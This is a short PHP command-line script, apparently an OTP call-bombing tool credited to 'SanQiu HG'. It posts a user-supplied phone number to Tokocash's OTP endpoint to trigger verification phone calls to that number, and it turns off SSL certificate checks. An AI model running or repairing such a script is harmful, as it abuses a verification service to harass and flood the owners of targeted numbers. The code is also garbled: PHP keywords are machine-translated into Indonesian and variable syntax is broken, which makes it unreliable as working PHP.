<?php
// Batasi 3x Telpon Setiap Satu Nomor
fungsi  kirim ( $ telepon ){
        $ ch = curl_init ();
        curl_setopt ( $ ch , CURLOPT_URL , "https://www.tokocash.com/oauth/otp" );                      curl_setopt ( $ ch , CURLOPT_SSL_VERIFYPEER , false );
        curl_setopt ( $ ch , CURLOPT_FOLLOWLOCATION , benar );
        curl_setopt ( $ ch , CURLOPT_RETURNTRANSFER , benar );
        curl_setopt ( $ ch , CURLOPT_HEADER , benar );
        curl_setopt ( $ ch , CURLOPT_POST , 1 );
        curl_setopt ( $ ch , CURLOPT_POSTFIELDS , "msisdn=$telepon&accept=panggilan" );                        $ asw = curl_exec ( $ ch );
        curl_close ( $ ch );
                gema  $ asw . "\n" ;
}
echo  "Copyright = SanQiu HG\n⏠⏡⏠⏡⏠⏡⏠⏡\n" ;
echo  "Nomor\nMasukan : " ;
$ nomor = trim ( fgets ( STDIN ));
$ eksekusi = kirim ( $ nomor );
cetak $ eksekusi ;
?>
